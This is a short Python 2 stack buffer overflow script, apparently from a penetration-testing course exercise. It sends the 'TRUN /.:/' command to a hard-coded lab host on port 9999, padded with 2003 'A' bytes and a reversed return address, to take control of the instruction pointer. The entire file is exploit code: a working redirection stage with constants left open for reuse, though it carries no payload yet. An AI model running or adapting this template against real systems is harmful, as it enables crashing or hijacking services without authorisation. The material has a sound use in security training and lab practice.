#!/usr/bin/python2
#Inspiration for this came from TCM Academy's Practical Ethical Hacking course in the Buffer Overflow section

import sys, socket

#Target IP
RHOST = '192.168.50.13'
#Target port
RPORT = 9999
#Vulnerable command of program
COMM = 'TRUN /.:/'
#Discovered offset (final number from simplefuzzer tool output)
OFFSET = 2003
#Character to use for buffer
BUFFCHAR = 'A'
#Discovered return address (in reverse- if it was 00 01 02[\x00\x01\x02] JMP would be \x02\x01\x00
JMP = '\xaf\x11\x50\x62'

TEST = BUFFCHAR * OFFSET + JMP

try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((RHOST, RPORT))
        s.send((COMM + TEST))
        s.close()

except:
        print "Error connecting to server"
        sys.exit()
